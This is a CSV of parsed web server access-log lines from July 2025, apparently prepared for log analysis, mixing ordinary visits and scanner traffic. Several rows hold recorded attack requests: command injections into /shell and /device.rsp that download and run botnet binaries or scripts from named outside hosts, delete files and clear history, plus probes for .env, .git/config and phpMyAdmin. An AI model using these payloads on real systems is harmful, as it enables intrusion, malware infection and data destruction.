line_no,raw_line,ip,ident,authuser,time_raw,time,request,method,path,protocol,status,size,referer,agent,parse_status,request_type,parse_note
2401,"20.65.154.175 - - [02/Jul/2025:21:59:18 +0900] ""MGLNDD_114.70.38.81_80\n"" 400 226 ""-"" ""-""",20.65.154.175,,,02/Jul/2025:21:59:18 +0900,2025-07-02 21:59:18+09:00,MGLNDD_114.70.38.81_80\n,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2402,"80.251.153.117 - - [02/Jul/2025:23:17:24 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46""",80.251.153.117,,,02/Jul/2025:23:17:24 +0900,2025-07-02 23:17:24+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",SUCCESS,STANDARD_HTTP,
2403,"119.237.241.79 - - [03/Jul/2025:00:49:55 +0900] ""GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1"" 404 232 ""-"" ""Hello, world""",119.237.241.79,,,03/Jul/2025:00:49:55 +0900,2025-07-03 00:49:55+09:00,GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1,GET,/shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws,HTTP/1.1,404,232,,"Hello, world",SUCCESS,STANDARD_HTTP,
2404,"38.225.100.87 - - [03/Jul/2025:00:50:07 +0900] ""GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1"" 404 232 ""-"" ""Hello, world""",38.225.100.87,,,03/Jul/2025:00:50:07 +0900,2025-07-03 00:50:07+09:00,GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1,GET,/shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws,HTTP/1.1,404,232,,"Hello, world",SUCCESS,STANDARD_HTTP,
2405,"66.63.179.126 - - [03/Jul/2025:00:50:08 +0900] ""GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1"" 404 232 ""-"" ""Hello, world""",66.63.179.126,,,03/Jul/2025:00:50:08 +0900,2025-07-03 00:50:08+09:00,GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1,GET,/shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws,HTTP/1.1,404,232,,"Hello, world",SUCCESS,STANDARD_HTTP,
2406,"182.120.130.77 - - [03/Jul/2025:00:50:29 +0900] ""GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1"" 404 232 ""-"" ""Hello, world""",182.120.130.77,,,03/Jul/2025:00:50:29 +0900,2025-07-03 00:50:29+09:00,GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1,GET,/shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws,HTTP/1.1,404,232,,"Hello, world",SUCCESS,STANDARD_HTTP,
2407,"156.246.94.234 - - [03/Jul/2025:00:51:32 +0900] ""GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1"" 404 232 ""-"" ""Hello, world""",156.246.94.234,,,03/Jul/2025:00:51:32 +0900,2025-07-03 00:51:32+09:00,GET /shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws HTTP/1.1,GET,/shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws,HTTP/1.1,404,232,,"Hello, world",SUCCESS,STANDARD_HTTP,
2408,"141.98.11.239 - - [03/Jul/2025:02:29:48 +0900] ""POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1"" 404 232 ""-"" ""Mozila/5.0""",141.98.11.239,,,03/Jul/2025:02:29:48 +0900,2025-07-03 02:29:48+09:00,POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk,HTTP/1.1,404,232,,Mozila/5.0,SUCCESS,STANDARD_HTTP,
2409,"80.251.153.117 - - [03/Jul/2025:03:19:21 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46""",80.251.153.117,,,03/Jul/2025:03:19:21 +0900,2025-07-03 03:19:21+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",SUCCESS,STANDARD_HTTP,
2410,"161.35.171.225 - - [03/Jul/2025:03:32:19 +0900] ""GET /.env HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);""",161.35.171.225,,,03/Jul/2025:03:32:19 +0900,2025-07-03 03:32:19+09:00,GET /.env HTTP/1.1,GET,/.env,HTTP/1.1,404,232,,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);,SUCCESS,STANDARD_HTTP,
2411,"161.35.171.225 - - [03/Jul/2025:03:32:19 +0900] ""GET /.git/config HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);""",161.35.171.225,,,03/Jul/2025:03:32:19 +0900,2025-07-03 03:32:19+09:00,GET /.git/config HTTP/1.1,GET,/.git/config,HTTP/1.1,404,232,,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);,SUCCESS,STANDARD_HTTP,
2412,"47.99.40.17 - - [03/Jul/2025:03:46:29 +0900] ""GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2Ffile.uhsea.com%2F2507%2Fc1dd7f9f580aea71fafebaadb60a78f43C.sh%3B+chmod+777+%2A%3B+sh+c1dd7f9f580aea71fafebaadb60a78f43C.sh%3B+rm+-rf+%2A.sh%3B+history+-c HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36""",47.99.40.17,,,03/Jul/2025:03:46:29 +0900,2025-07-03 03:46:29+09:00,GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2Ffile.uhsea.com%2F2507%2Fc1dd7f9f580aea71fafebaadb60a78f43C.sh%3B+chmod+777+%2A%3B+sh+c1dd7f9f580aea71fafebaadb60a78f43C.sh%3B+rm+-rf+%2A.sh%3B+history+-c HTTP/1.1,GET,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2Ffile.uhsea.com%2F2507%2Fc1dd7f9f580aea71fafebaadb60a78f43C.sh%3B+chmod+777+%2A%3B+sh+c1dd7f9f580aea71fafebaadb60a78f43C.sh%3B+rm+-rf+%2A.sh%3B+history+-c,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",SUCCESS,STANDARD_HTTP,
2413,"3.83.32.20 - - [03/Jul/2025:04:08:21 +0900] ""CONNECT google.com:443 HTTP/1.1"" 405 178 ""-"" ""Go-http-client/1.1""",3.83.32.20,,,03/Jul/2025:04:08:21 +0900,2025-07-03 04:08:21+09:00,CONNECT google.com:443 HTTP/1.1,CONNECT,google.com:443,HTTP/1.1,405,178,,Go-http-client/1.1,SUCCESS,STANDARD_HTTP,
2414,"141.98.11.239 - - [03/Jul/2025:04:27:20 +0900] ""POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1"" 404 232 ""-"" ""Mozila/5.0""",141.98.11.239,,,03/Jul/2025:04:27:20 +0900,2025-07-03 04:27:20+09:00,POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk,HTTP/1.1,404,232,,Mozila/5.0,SUCCESS,STANDARD_HTTP,
2415,"45.131.155.253 - - [03/Jul/2025:04:41:53 +0900] ""\x16\x03\x01"" 400 226 ""-"" ""-""",45.131.155.253,,,03/Jul/2025:04:41:53 +0900,2025-07-03 04:41:53+09:00,\x16\x03\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2416,"45.131.155.253 - - [03/Jul/2025:04:42:07 +0900] ""\x16\x03\x01"" 400 226 ""-"" ""-""",45.131.155.253,,,03/Jul/2025:04:42:07 +0900,2025-07-03 04:42:07+09:00,\x16\x03\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2417,"45.131.155.253 - - [03/Jul/2025:04:42:33 +0900] ""\x16\x03\x01"" 400 226 ""-"" ""-""",45.131.155.253,,,03/Jul/2025:04:42:33 +0900,2025-07-03 04:42:33+09:00,\x16\x03\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2418,"45.131.155.253 - - [03/Jul/2025:04:42:35 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36""",45.131.155.253,,,03/Jul/2025:04:42:35 +0900,2025-07-03 04:42:35+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
2419,"141.98.11.239 - - [03/Jul/2025:04:46:32 +0900] ""POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1"" 404 232 ""-"" ""Mozila/5.0""",141.98.11.239,,,03/Jul/2025:04:46:32 +0900,2025-07-03 04:46:32+09:00,POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk,HTTP/1.1,404,232,,Mozila/5.0,SUCCESS,STANDARD_HTTP,
2420,"109.122.198.105 - - [03/Jul/2025:05:32:40 +0900] ""PUT /SDK/webLanguage HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""",109.122.198.105,,,03/Jul/2025:05:32:40 +0900,2025-07-03 05:32:40+09:00,PUT /SDK/webLanguage HTTP/1.1,PUT,/SDK/webLanguage,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",SUCCESS,STANDARD_HTTP,
2421,"5.235.222.8 - - [03/Jul/2025:05:33:28 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""",5.235.222.8,,,03/Jul/2025:05:33:28 +0900,2025-07-03 05:33:28+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",SUCCESS,STANDARD_HTTP,
2422,"179.0.232.243 - - [03/Jul/2025:05:55:22 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7""",179.0.232.243,,,03/Jul/2025:05:55:22 +0900,2025-07-03 05:55:22+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",SUCCESS,STANDARD_HTTP,
2423,"165.232.48.65 - - [03/Jul/2025:05:56:29 +0900] ""\x16\x03\x01"" 400 226 ""-"" ""-""",165.232.48.65,,,03/Jul/2025:05:56:29 +0900,2025-07-03 05:56:29+09:00,\x16\x03\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2424,"165.232.48.65 - - [03/Jul/2025:05:56:29 +0900] ""\x16\x03\x01"" 400 226 ""-"" ""-""",165.232.48.65,,,03/Jul/2025:05:56:29 +0900,2025-07-03 05:56:29+09:00,\x16\x03\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2425,"165.232.48.65 - - [03/Jul/2025:05:56:30 +0900] ""\x16\x03\x01"" 400 226 ""-"" ""-""",165.232.48.65,,,03/Jul/2025:05:56:30 +0900,2025-07-03 05:56:30+09:00,\x16\x03\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2426,"165.232.48.65 - - [03/Jul/2025:05:56:30 +0900] ""GET /form.html HTTP/1.1"" 404 232 ""-"" ""curl/8.1.2""",165.232.48.65,,,03/Jul/2025:05:56:30 +0900,2025-07-03 05:56:30+09:00,GET /form.html HTTP/1.1,GET,/form.html,HTTP/1.1,404,232,,curl/8.1.2,SUCCESS,STANDARD_HTTP,
2427,"165.232.48.65 - - [03/Jul/2025:05:56:30 +0900] ""GET /upl.php HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0""",165.232.48.65,,,03/Jul/2025:05:56:30 +0900,2025-07-03 05:56:30+09:00,GET /upl.php HTTP/1.1,GET,/upl.php,HTTP/1.1,404,232,,Mozilla/5.0,SUCCESS,STANDARD_HTTP,
2428,"165.232.48.65 - - [03/Jul/2025:05:56:31 +0900] ""GET /geoip/ HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",165.232.48.65,,,03/Jul/2025:05:56:31 +0900,2025-07-03 05:56:31+09:00,GET /geoip/ HTTP/1.1,GET,/geoip/,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
2429,"165.232.48.65 - - [03/Jul/2025:05:56:31 +0900] ""GET /favicon.ico HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",165.232.48.65,,,03/Jul/2025:05:56:31 +0900,2025-07-03 05:56:31+09:00,GET /favicon.ico HTTP/1.1,GET,/favicon.ico,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
2430,"165.232.48.65 - - [03/Jul/2025:05:56:31 +0900] ""GET /1.php HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",165.232.48.65,,,03/Jul/2025:05:56:31 +0900,2025-07-03 05:56:31+09:00,GET /1.php HTTP/1.1,GET,/1.php,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
2431,"165.232.48.65 - - [03/Jul/2025:05:56:31 +0900] ""GET /password.php HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",165.232.48.65,,,03/Jul/2025:05:56:31 +0900,2025-07-03 05:56:31+09:00,GET /password.php HTTP/1.1,GET,/password.php,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
2432,"165.232.48.65 - - [03/Jul/2025:05:56:32 +0900] ""GET /systembc/password.php HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",165.232.48.65,,,03/Jul/2025:05:56:32 +0900,2025-07-03 05:56:32+09:00,GET /systembc/password.php HTTP/1.1,GET,/systembc/password.php,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
2433,"165.232.48.65 - - [03/Jul/2025:05:56:32 +0900] ""GET /t4 HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0""",165.232.48.65,,,03/Jul/2025:05:56:32 +0900,2025-07-03 05:56:32+09:00,GET /t4 HTTP/1.1,GET,/t4,HTTP/1.1,404,232,,Mozilla/5.0,SUCCESS,STANDARD_HTTP,
2434,"87.121.84.149 - - [03/Jul/2025:06:25:21 +0900] ""GET http://ifconfig.me/ HTTP/1.1"" 200 3809 ""-"" ""curl/7.81.0""",87.121.84.149,,,03/Jul/2025:06:25:21 +0900,2025-07-03 06:25:21+09:00,GET http://ifconfig.me/ HTTP/1.1,GET,http://ifconfig.me/,HTTP/1.1,200,3809,,curl/7.81.0,SUCCESS,STANDARD_HTTP,
2435,"206.168.34.211 - - [03/Jul/2025:06:48:41 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)""",206.168.34.211,,,03/Jul/2025:06:48:41 +0900,2025-07-03 06:48:41+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),SUCCESS,STANDARD_HTTP,
2436,"206.168.34.211 - - [03/Jul/2025:06:48:43 +0900] ""GET /favicon.ico HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)""",206.168.34.211,,,03/Jul/2025:06:48:43 +0900,2025-07-03 06:48:43+09:00,GET /favicon.ico HTTP/1.1,GET,/favicon.ico,HTTP/1.1,404,232,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),SUCCESS,STANDARD_HTTP,
2437,"206.168.34.211 - - [03/Jul/2025:06:48:47 +0900] ""PRI * HTTP/2.0"" 400 226 ""-"" ""-""",206.168.34.211,,,03/Jul/2025:06:48:47 +0900,2025-07-03 06:48:47+09:00,PRI * HTTP/2.0,PRI,*,HTTP/2.0,400,226,,,SUCCESS,STANDARD_HTTP,
2438,"206.168.34.211 - - [03/Jul/2025:06:48:54 +0900] ""GET /favicon.ico HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)""",206.168.34.211,,,03/Jul/2025:06:48:54 +0900,2025-07-03 06:48:54+09:00,GET /favicon.ico HTTP/1.1,GET,/favicon.ico,HTTP/1.1,404,232,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),SUCCESS,STANDARD_HTTP,
2439,"206.168.34.211 - - [03/Jul/2025:06:48:55 +0900] ""PRI * HTTP/2.0"" 400 226 ""-"" ""-""",206.168.34.211,,,03/Jul/2025:06:48:55 +0900,2025-07-03 06:48:55+09:00,PRI * HTTP/2.0,PRI,*,HTTP/2.0,400,226,,,SUCCESS,STANDARD_HTTP,
2440,"206.168.34.211 - - [03/Jul/2025:06:49:01 +0900] ""\x16\x03\x01"" 400 226 ""-"" ""-""",206.168.34.211,,,03/Jul/2025:06:49:01 +0900,2025-07-03 06:49:01+09:00,\x16\x03\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2441,"206.168.34.211 - - [03/Jul/2025:06:49:02 +0900] ""GET /wiki HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)""",206.168.34.211,,,03/Jul/2025:06:49:02 +0900,2025-07-03 06:49:02+09:00,GET /wiki HTTP/1.1,GET,/wiki,HTTP/1.1,404,232,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),SUCCESS,STANDARD_HTTP,
2442,"185.218.84.46 - - [03/Jul/2025:07:01:58 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""-""",185.218.84.46,,,03/Jul/2025:07:01:58 +0900,2025-07-03 07:01:58+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,,SUCCESS,STANDARD_HTTP,
2443,"20.163.2.151 - - [03/Jul/2025:07:11:14 +0900] ""GET /portal/redlion HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 zgrab/0.x""",20.163.2.151,,,03/Jul/2025:07:11:14 +0900,2025-07-03 07:11:14+09:00,GET /portal/redlion HTTP/1.1,GET,/portal/redlion,HTTP/1.1,404,232,,Mozilla/5.0 zgrab/0.x,SUCCESS,STANDARD_HTTP,
2444,"185.194.204.246 - - [03/Jul/2025:07:24:24 +0900] ""\x16\x03\x01\x01\x9a\x01"" 400 226 ""-"" ""-""",185.194.204.246,,,03/Jul/2025:07:24:24 +0900,2025-07-03 07:24:24+09:00,\x16\x03\x01\x01\x9a\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
2445,"87.121.84.149 - - [03/Jul/2025:07:36:39 +0900] ""GET http://ifconfig.me/ HTTP/1.1"" 200 3809 ""-"" ""curl/7.81.0""",87.121.84.149,,,03/Jul/2025:07:36:39 +0900,2025-07-03 07:36:39+09:00,GET http://ifconfig.me/ HTTP/1.1,GET,http://ifconfig.me/,HTTP/1.1,200,3809,,curl/7.81.0,SUCCESS,STANDARD_HTTP,
2446,"206.189.206.126 - - [03/Jul/2025:08:17:26 +0900] ""GET /sql/sqlweb/index.php?lang=en HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36""",206.189.206.126,,,03/Jul/2025:08:17:26 +0900,2025-07-03 08:17:26+09:00,GET /sql/sqlweb/index.php?lang=en HTTP/1.1,GET,/sql/sqlweb/index.php?lang=en,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
2447,"206.189.206.126 - - [03/Jul/2025:08:17:26 +0900] ""GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36""",206.189.206.126,,,03/Jul/2025:08:17:26 +0900,2025-07-03 08:17:26+09:00,GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1,GET,/db/phpMyAdmin/index.php?lang=en,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
2448,"206.189.206.126 - - [03/Jul/2025:08:17:27 +0900] ""GET /phpmyadmin_/index.php?lang=en HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36""",206.189.206.126,,,03/Jul/2025:08:17:27 +0900,2025-07-03 08:17:27+09:00,GET /phpmyadmin_/index.php?lang=en HTTP/1.1,GET,/phpmyadmin_/index.php?lang=en,HTTP/1.1,404,232,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",SUCCESS,STANDARD_HTTP,
